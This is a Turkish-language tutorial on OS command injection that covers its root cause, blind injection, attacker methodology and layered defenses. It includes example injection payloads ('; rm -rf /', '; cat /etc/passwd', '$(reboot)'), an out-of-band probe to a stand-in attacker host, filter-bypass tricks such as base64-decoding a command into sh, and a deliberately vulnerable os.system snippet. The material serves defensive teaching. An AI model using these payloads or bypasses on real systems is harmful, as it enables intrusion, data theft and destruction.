# OS Command Injection (İşletim Sistemi Komut Enjeksiyonu)

## Tanım

OS Command Injection, bir uygulamanın kullanıcıdan ya da dış bir kaynaktan aldığı veriyi, çalıştığı işletim sisteminin bir kabuk (shell) komutunun içine güvensiz biçimde yerleştirmesi sonucu ortaya çıkan bir güvenlik açığıdır. Saldırgan, uygulamanın beklediği "veriyi" değil, kabuğun "komut" olarak yorumlayacağı meta-karakterler ve ek komutlar gönderdiğinde, uygulamanın kimliğiyle keyfî sistem komutları çalıştırabilir. Bu açık, OWASP'ın uzun yıllardır listelediği Injection sınıfının bir üyesidir ve tipik olarak Remote Code Execution (RCE) ile sonuçlandığı için etkisi en yüksek zafiyetler arasında yer alır.

Kritik ayrım şudur: Command Injection ile Code Injection farklı şeylerdir. Code Injection'da saldırgan, uygulamanın yorumladığı dilin (örneğin PHP, Python) koduna müdahale eder. Command Injection'da ise araya giren katman işletim sisteminin kabuğudur; enjekte edilen şey `/bin/sh`, `bash` veya Windows'ta `cmd.exe` / `PowerShell` tarafından yorumlanan bir komut satırıdır. Bu makalenin bütün odağı bu ikinci durumdadır.

## Kök Neden ve Çalışma Mantığı: Neden Böyle Oluyor?

Zafiyetin gerçek kök nedeni tek bir cümlede özetlenebilir: **veri ile kod aynı düzlemde birleştirilir (concatenation) ve bu birleşimi yorumlayan bir kabuk devreye girer.** Sorun kullanıcının "kötü" veri göndermesi değildir; sorun, uygulamanın veriyi kabuğun sözdizimsel olarak ayrıştırdığı bir bağlama, hiçbir sınır koymadan yerleştirmesidir.

Bunu anlamak için kabuğun ne yaptığını hatırlamak gerekir. Bir kabuk kendisine verilen metni saf bir dize (string) olarak görmez; onu **tokenize eder**, meta-karakterleri yorumlar, kelimeleri ayırır, değişkenleri genişletir ve boru hatları (pipeline) kurar. Kabuk için `;`, `|`, `&`, `&&`, `||`, `$(...)`, backtick, `>`, `<`, `\n` (yeni satır) gibi karakterler birer kontrol sembolüdür. Uygulama `ping -c 1 <kullanıcı_girdisi>` gibi bir dizeyi kabuğa geçirdiğinde ve kullanıcı girdisi `8.8.8.8; rm -rf /` ise, kabuk bu metni "önce ping çalıştır, sonra `rm` çalıştır" olarak okur. Uygulama tek bir komut çalıştırdığını sanır; kabuk ise iki komut görür.

Buradaki asıl kavramsal hata **kabuğun aracı olarak devreye sokulmasıdır.** Programcı çoğu zaman bir kabuğa hiç ihtiyaç duymaz — sadece bir programı belirli argümanlarla çalıştırmak ister. Ancak `system()`, `popen()`, PHP'de `shell_exec()`, Python'da `os.system()` veya `subprocess.run(..., shell=True)`, Node.js'te `child_process.exec()` gibi API'ler, verilen dizeyi doğrudan bir kabuğa teslim eder. Kabuk devreye girdiği an, tüm meta-karakter yorumlaması da devreye girer. İşte bu yüzden "shell çağırma" tek başına bir tehlike kaynağıdır.

### Shell Çağırma Tehlikesi: Neden Sadece Kabuğu Çağırmak Bile Risklidir?

Command Injection'ın merkezindeki tehlike, kodun bir işletim sistemi kabuğunu araya sokmasıdır. Bunu iki mantıksal katmana ayırarak düşünmek gerekir:

1. **Komut oluşturma (dize birleştirme) katmanı.** Uygulama bir komut satırı dizesi kurar.
2. **Yorumlama katmanı.** Bu dize bir kabuğa verilir ve kabuk onu ayrıştırır.

Zafiyet, ikinci katmanın var olmasından doğar. Eğer kabuk hiç devreye girmezse — yani uygulama işletim sistemine "şu programı, tam olarak şu argümanlarla çalıştır" derse — meta-karakter yorumlaması diye bir olay kalmaz. `;` karakteri artık bir komut ayırıcı değil, sadece argümanın içindeki bir noktalı virgül olur.

Bu yüzden kıdemli bir bakış açısıyla söylenmesi gereken şudur: **shell=True (ya da shell çağıran herhangi bir API) bir "kolaylık" gibi görünür ama aslında saldırı yüzeyini açan asıl anahtardır.** Kabuğu çağırmak; ortam değişkeni genişletmesi, glob (joker karakter) genişletmesi, komut ikamesi (`$(...)`), boru hattı, yönlendirme gibi düzinelerce özelliği aynı anda etkinleştirir. Bunların hepsi, kullanıcı girdisinin komut olarak yorumlanabileceği yeni yollar demektir.

Buna ek olarak, kabuğu çağırdığınızda uygulamanız artık **iki farklı kabuğun sözdizimine** maruz kalabilir: POSIX kabukları (`sh`, `bash`) ile Windows'un `cmd.exe` ve `PowerShell`'i çok farklı kaçış (escape) ve meta-karakter kurallarına sahiptir. Windows tarafında `cmd.exe`, `&`, `|`, `%VAR%` genişletmesi ve `^` kaçış karakteriyle kendine özgü tuhaflıklar barındırır; bir POSIX kabuğu için yazdığınız "temizleme" mantığı Windows kabuğunda tamamen delik olabilir. Yani kabuğu çağırdığınız anda, platform başına farklı ve tam olarak modellemesi zor bir ayrıştırıcıyla uğraşmak zorunda kalırsınız.

## Somut Örnekler

### Klasik zafiyetli kod

Bir ağ teşhis aracının kullanıcıdan bir host adı alıp `ping` çalıştırdığını düşünelim. Python'da tipik hatalı kod:

```python
import os

host = request.args.get("host")           # kullanıcıdan gelir
os.system("ping -c 1 " + host)            # ZAFİYETLİ
```

Kullanıcı `host` alanına `8.8.8.8` yazarsa çalışan komut `ping -c 1 8.8.8.8` olur ve her şey normaldir. Ancak saldırgan şunu yazarsa:

```
8.8.8.8; cat /etc/passwd
```

Çalışan gerçek komut şu hâle gelir:

```
ping -c 1 8.8.8.8; cat /etc/passwd
```

Kabuk `;` gördüğünde iki ayrı komutu sırayla çalıştırır. Artık saldırgan sistemdeki kullanıcı listesini okumuştur. Aynı sonuca farklı meta-karakterlerle de ulaşılabilir:

- `8.8.8.8 && whoami` — ping başarılıysa `whoami` de çalışır (koşullu zincirleme).
- `8.8.8.8 | id` — ping çıktısı `id` komutuna borulanır; asıl amaç `id` komutunu çalıştırmaktır.
- `8.8.8.8 $(reboot)` — komut ikamesi; iç komut önce çalışır.
- `` 8.8.8.8 `reboot` `` — backtick ile eski usul komut ikamesi.
- `8.8.8.8%0acat /etc/passwd` — URL bağlamında satır sonu (newline) enjeksiyonu.

### Kör (Blind) Command Injection

Her zaman komutun çıktısı ekrana yansımaz. Uygulama komut çıktısını hiç göstermiyorsa saldırgan **kör** durumdadır ama açık hâlâ sömürülebilir. Bu durumda dolaylı kanıt kanalları kullanılır:

- **Zaman tabanlı (time-based):** Girdiye `; sleep 10` eklenir. Yanıt gözle görülür biçimde 10 saniye gecikirse komut çalışmıştır.
- **Bant dışı (out-of-band, OOB):** Girdiye `; nslookup saldirgan-sunucusu.example` eklenir. Saldırganın kontrolündeki DNS/HTTP sunucusuna bir istek düşerse komutun çalıştığı doğrulanmış olur. Veri sızdırma da bu kanaldan yapılabilir (örneğin bir dosyanın içeriğini alt alan adı olarak DNS sorgusuna gömmek).

Kör senaryonun önemi şudur: "Ben çıktıyı göstermiyorum, o hâlde güvendeyim" düşüncesi yanlıştır. Komutun **yan etkileri** (dosya silme, ters kabuk açma, ağ isteği yapma) çıktı gösterilmese de gerçekleşir.

## Sömürü / İstismar Mantığı

Saldırganın bakış açısıyla süreç genellikle şu adımlarla ilerler. Bu mantığı bilmek savunmayı da doğrudan besler.

**1. Enjeksiyon noktasını bulma.** Saldırgan, kullanıcı girdisinin bir sistem komutuna dönüşmüş olabileceği yerleri arar: dosya yükleme sırasında dosya adı, görüntü/PDF dönüştürme parametreleri, DNS/ping/traceroute araçları, arşiv açma, e-posta gönderme, yazdırma, "export" işlevleri. İlk deneme genellikle zararsız bir prob'dur — örneğin girdiye `;id` ya da `| id` eklemek ve çıktıda `uid=...` görünüp görünmediğine bakmak.

**2. Bağlamı ve kabuğu anlama.** Saldırgan girdisinin komut satırında nereye düştüğünü çözmeye çalışır: tırnak içinde mi, tırnaksız mı, hangi kabuk (POSIX mu, `cmd.exe` mi). Girdi çift tırnak içindeyse önce tırnaktan çıkmak (`"`), tek tırnak içindeyse (`'`) çıkmak gerekir. Bağlamı çözmek, hangi meta-karakterin işe yarayacağını belirler.

**3. Filtreleri atlatma (bypass).** Uygulama bazı karakterleri engelliyorsa saldırgan alternatiflere yönelir:
- Boşluk engelliyse `${IFS}` (POSIX'te alan ayırıcı) ya da `<` ile boşluk üretme.
- `;` ve `|` engelliyse `%0a` (newline) veya `&&` deneme.
- Kelime engelliyse (`cat` yasaklıysa) `c""at`, `c\at`, `/bin/ca''t` gibi parçalama teknikleri.
- Doğrudan çalıştırma engelliyse Base64 ile kodlanmış komutu `echo ... | base64 -d | sh` biçiminde çözüp çalıştırma.

**4. Kalıcılık ve yatay hareket.** Enjeksiyon doğrulandıktan sonra amaç genellikle bir **reverse shell** (ters kabuk) açmaktır: hedef makinenin saldırganın dinlediği porta bağlanmasını sağlamak. Bunun ardından ayrıcalık yükseltme (privilege escalation), kimlik bilgisi toplama ve ağ içinde yayılma gelir.

Bu adımların hepsinin ortak noktası: **kabuğun meta-karakter yorumlaması olmasaydı hiçbiri mümkün olmazdı.** Savunmanın kalbi de bu yüzden "kabuğu ortadan kaldırmaktır".

## Savunma: Kök Nedeni Ortadan Kaldırmak

Savunmayı önem sırasına göre katmanlı düşünmek gerekir. En üstteki iki madde asıl çözümdür; alttakiler destekleyici (defense-in-depth) önlemlerdir.

### 1. Kabuğu hiç çağırmayın; argüman dizisi (argument array) kullanın

En sağlam ve en temel savunma budur. Kabuk çağırmak yerine, çalıştırılacak programı ve argümanlarını **ayrı ayrı elemanlardan oluşan bir dizi** olarak işletim sistemine verin. Böylece meta-karakter yorumlayan hiçbir kabuk devreye girmez; işletim sistemi doğrudan programı çalıştırır ve dizinin her elemanı, içeriği ne olursa olsun, tek bir argüman olarak geçer.

Mantık şudur: `execve` gibi düşük seviye sistem çağrıları zaten bir program yolu ve bir argüman dizisi (`argv`) bekler. Kabuk sadece "kullanıcı dostu bir metni bu diziye çeviren" bir ara katmandır. O ara katmanı kaldırdığınızda, `;` ya da `$(...)` gibi karakterlerin özel bir anlamı kalmaz.

Python'da doğru kullanım:

```python
import subprocess

host = request.args.get("host")
# shell=True YOK; argümanlar bir liste; kabuk devrede değil
subprocess.run(["ping", "-c", "1", host], check=True)
```

Burada `host` değeri `8.8.8.8; cat /etc/passwd` olsa bile, bu değerin tamamı `ping` programına **tek bir argüman** olarak geçer. `ping` böyle bir host adını çözemez ve hata döner; `cat` diye bir şey asla çalışmaz. Çünkü ayrıştıran bir kabuk yoktur.

Diğer dillerde karşılıkları:
- **Node.js:** `child_process.exec()` yerine `child_process.execFile("ping", ["-c", "1", host])` veya `spawn` kullanın. `exec` bir kabuk çağırır; `execFile`/`spawn` (varsayılan olarak `shell: false`) çağırmaz.
- **Java:** Tek bir dize yerine `ProcessBuilder`'a argümanları ayrı ayrı verin: `new ProcessBuilder("ping", "-c", "1", host)`. `Runtime.exec(String)` biçiminden kaçının, çünkü dize ayrıştırma davranışı beklenmediktir.
- **Go:** `exec.Command("ping", "-c", "1", host)` zaten kabuk çağırmaz; kabuk ancak `sh -c` gibi bir şey açıkça yazarsanız devreye girer.
- **PHP:** `shell_exec` / `exec` yerine `proc_open` ile argümanları dizi olarak vermek daha kontrollüdür.

**Kritik uyarı:** Argüman dizisi kullanmak, sadece "komut zincirleme" saldırısını (`; rm ...`) engeller. **Argüman enjeksiyonunu (argument injection) tek başına engellemez.** Kullanıcı girdisi bir programın argümanı olarak geçtiğinde, `-` ile başlayan bir değer o programın bayrağı (flag) olarak yorumlanabilir. Örneğin kullanıcı girdisini `find` ya da `tar` gibi bir programa argüman olarak veriyorsanız, saldırgan `--checkpoint-action=exec=...` gibi bir bayrak enjekte ederek yine komut çalıştırabilir. Bunun çözümü, mümkünse argümanı `--` ile ayırmak (çoğu POSIX aracı `--` sonrasını "artık bayrak yok, hepsi konumsal argüman" diye yorumlar) ve girdinin `-` ile başlamasına izin vermemektir.

### 2. Allow-list (izin listesi) ile doğrulama

Argüman dizisi kullanmak zafiyetin ana kanalını kapatır; ama derinlemesine savunma için girdinin kendisini de doğrulamak gerekir. Burada altın kural, **deny-list (yasak liste) değil allow-list (izin listesi) kullanmaktır.**

Neden allow-list? Çünkü deny-list (kara liste) yaklaşımı, "şu tehlikeli karakterleri yasaklayayım" mantığıyla çalışır ve bu mantık kaçınılmaz olarak eksiktir. Kabuk meta-karakterlerinin sayısı çoktur; platformlar arası farklıdır; kodlama (URL encoding, Unicode) hileleriyle atlatılabilir; ve bugün düşündüğünüz listeye yarın yeni bir kaçış tekniği eklenir. Bir tek karakteri unutmanız açığı yeniden açar. Deny-list, saldırganın hayal gücüyle yarışmaya çalışmaktır ve bu yarış her zaman kaybedilir.

Allow-list ise tersini yapar: "Şunlara izin veriyorum, geri kalan **her şeyi** reddediyorum." Bu, güvenli tarafın tam olarak tanımlanmasıdır. İki biçimde uygulanır:

- **Değer allow-list'i:** Girdi sınırlı ve bilinen bir kümeden geliyorsa (örneğin bir dil kodu, bir bölge adı, bir işlem türü), gelen değerin bu kümedeki geçerli değerlerden **birine tam olarak eşit** olduğunu doğrulayın. Örneğin komut olarak yalnızca `start`, `stop`, `restart` kabul ediliyorsa, bu üç dizeye eşitlik kontrolü yapın; başka her şeyi reddedin. Kullanıcı asla ham komut metni sağlamaz, sadece bir seçim yapar; siz o seçimi sabit koda eşlersiniz (lookup table / map).

- **Karakter allow-list'i (biçim doğrulama):** Girdi serbest metinse ama biçimi bilinebiliyorsa (örneğin bir IP adresi, bir alan adı, bir dosya adı), izin verilen karakter kümesini pozitif bir düzenli ifadeyle (regex) tanımlayın. Örneğin bir host adı için yalnızca harf, rakam, nokta ve tireye izin verip (`^[A-Za-z0-9.-]+$`), bu kalıba uymayan her girdiyi reddedin. Böyle bir kalıp `;`, `|`, `$`, boşluk, tırnak gibi hiçbir tehlikeli karaktere yer vermez.

Allow-list doğrulamasında sık yapılan bir yanlış, regex'i **ankraj (anchor) olmadan** yazmaktır. `[A-Za-z0-9.-]+` kalıbı `^...$` ile sınırlandırılmazsa, dizenin sadece bir bölümünün eşleşmesi yeterli sayılabilir ve `8.8.8.8; rm -rf /` gibi bir girdi "içinde geçerli bir parça var" diye kabul görebilir. Kalıbı her zaman dizenin başına ve sonuna sabitleyin. Ayrıca çok satırlı girdilerde `$` bazı motorlarda satır sonunu da eşler; bu yüzden dize sonu için `\z` gibi kesin bir çapa ya da açık uzunluk/newline kontrolü tercih edilmelidir.

Allow-list'in gücü, argüman dizisiyle **birlikte** kullanıldığında ortaya çıkar: argüman dizisi kabuk yorumlamasını yok eder, allow-list ise argüman enjeksiyonu ve mantıksal kötüye kullanım gibi kalan riskleri daraltır.

### 3. Destekleyici (defense-in-depth) önlemler

Yukarıdaki iki katman asıl savunmadır. Bunların üstüne şu önlemler eklenmelidir:

- **En az ayrıcalık (least privilege).** Süreci mümkün olan en düşük yetkiyle çalıştırın. Enjeksiyon gerçekleşse bile `root`/`SYSTEM` yerine kısıtlı bir kullanıcıyla çalışan süreç, saldırganın yapabileceklerini sınırlar.
- **Sandbox / izolasyon.** Konteyner, seccomp, AppArmor/SELinux profilleri ile sürecin erişebileceği sistem çağrılarını, dosyaları ve ağı kısıtlayın. Böylece başarılı bir enjeksiyonun "patlama yarıçapı" (blast radius) daralır.
- **Ağ çıkış (egress) kısıtlaması.** Sürecin dışarıya keyfî bağlantı kurmasını engellemek, hem reverse shell'i hem de OOB veri sızdırmayı zorlaştırır.
- **Yerleşik kütüphaneleri tercih etme.** Çoğu durumda dış bir programı hiç çağırmanıza gerek yoktur. Dosya kopyalama, DNS çözümleme, arşiv açma, görüntü işleme gibi işler için dilin/çatının yerleşik kütüphanesini kullanmak, kabuk çağırma ihtiyacını tümden ortadan kaldırır. Bir DNS sorgusu için `nslookup` çağırmak yerine dilin DNS çözümleme API'sini kullanmak hem daha güvenli hem daha taşınabilirdir.

## Yaygın Hatalar

Uygulamada tekrar tekrar görülen ve zafiyeti yeniden açan hatalar şunlardır:

- **"Girdiyi temizledim (sanitize) o hâlde güvendeyim" yanılgısı.** Kaçış (escaping) ve temizleme, kabuk çağırmayı sürdürürken yapılan en kırılgan savunmadır. Kabuğun sözdizimi karmaşık ve platforma bağlıdır; elle yazılan kaçış mantığı neredeyse her zaman bir açık bırakır. Doğru refleks temizlemeyi güçlendirmek değil, **kabuğu ortadan kaldırmaktır.**
- **Deny-list'e güvenmek.** Yalnızca `;`, `|`, `&` gibi birkaç karakteri yasaklamak; `$(...)`, backtick, newline (`%0a`), `${IFS}`, `>` gibi onlarca alternatifi açık bırakır. Tehlikeliyi listelemek değil, güvenliyi listelemek gerekir.
- **Yalnızca istemci tarafında (client-side) doğrulama.** Tarayıcıdaki JavaScript doğrulaması yalnızca kullanılabilirlik içindir; saldırgan isteği doğrudan sunucuya gönderir. Bütün doğrulama sunucu tarafında yapılmalıdır.
- **Argüman dizisi kullanıp yine de girdiyi başka bir kabuğa aktarmak.** Örneğin argüman dizisiyle çağırdığınız programın kendisi (bir betik) girdiyi alıp içeride `sh -c` ile çalıştırıyorsa, zafiyet katman kaymış ama kapanmamıştır. Zincirin tamamını izlemek gerekir.
- **Dosya adlarını ve yollarını "veri" sanmak.** Yüklenen bir dosyanın adı `; rm -rf /` içerebilir. Dosya adı sonradan bir komuta girerse aynı açık ortaya çıkar. Dosya adlarına da allow-list uygulanmalı, hatta sunucu tarafında yeniden üretilmelidir.
- **Argüman enjeksiyonunu unutmak.** Kabuk çağrılmasa bile, `-` ile başlayan kullanıcı girdisinin bir bayrak olarak yorumlanabileceği gözden kaçar. `--` ayırıcısı ve "başında `-` olamaz" kuralı ihmal edilmemelidir.
- **Ortam değişkenleri ve dolaylı girdi kaynaklarını atlamak.** Enjeksiyon her zaman doğrudan form alanından gelmez; HTTP başlıkları, User-Agent, çerezler, veritabanından okunan eski kayıtlar (second-order / stored injection) da komut oluştururken kullanılıyorsa birer enjeksiyon kaynağıdır.

## En İyi Pratikler (Özet)

Bir kıdemli mühendisin bu konuda takip etmesi gereken zihinsel kontrol listesi şudur:

1. **Öncelikle sorun:** Bu işi bir dış program çağırmadan, dilin/çatının yerleşik kütüphanesiyle yapabilir miyim? Yapabiliyorsam kabuk sorununu tümden ortadan kaldırırım.
2. **Bir dış program çağırmak zorundaysam,** onu **asla bir kabuk üzerinden** çağırmam. `shell=True`, `exec`, `system`, `popen(cmd_string)` gibi kabuk çağıran biçimlerden kaçınırım.
3. **Programı ve argümanlarını her zaman bir argüman dizisi (array) olarak** işletim sistemine veririm; böylece meta-karakter yorumlayan bir kabuk devreye girmez.
4. **Kullanıcı girdisini allow-list ile doğrularım:** ya bilinen geçerli değerlere tam eşitlik (sabit eşleme), ya da başı-sonu sabitlenmiş pozitif bir regex ile biçim kontrolü. Deny-list kullanmam.
5. **Argüman enjeksiyonuna karşı** `--` ayırıcısını kullanır ve kullanıcı girdisinin `-` ile başlamasına izin vermem.
6. **Derinlemesine savunma** olarak: süreci en az ayrıcalıkla çalıştırır, sandbox/konteyner ile izole eder, ağ çıkışını kısıtlarım.
7. **Bütün doğrulamayı sunucu tarafında yaparım** ve dolaylı girdi kaynaklarını (başlıklar, dosya adları, saklanmış veriler) da girdi olarak sayarım.
8. **Denetim ve test:** Statik analiz (SAST) araçlarıyla kabuk çağıran API kullanımlarını, dinamik testlerle (DAST) ve kod incelemesiyle enjeksiyon noktalarını düzenli olarak ararım.

Bütün bu pratiklerin ortak felsefesi tek bir cümlede toplanır: **Veri ile kodu asla aynı düzlemde birleştirme; ve mümkünse yorumlayacak kabuğu hiç sahneye çıkarma.** Command Injection'a karşı en güçlü savunma, akıllı bir filtre yazmak değil, filtreye ihtiyaç bırakmayan bir mimari kurmaktır: argüman dizisiyle kabuğu devre dışı bırakmak ve girdiyi allow-list ile daraltmak.
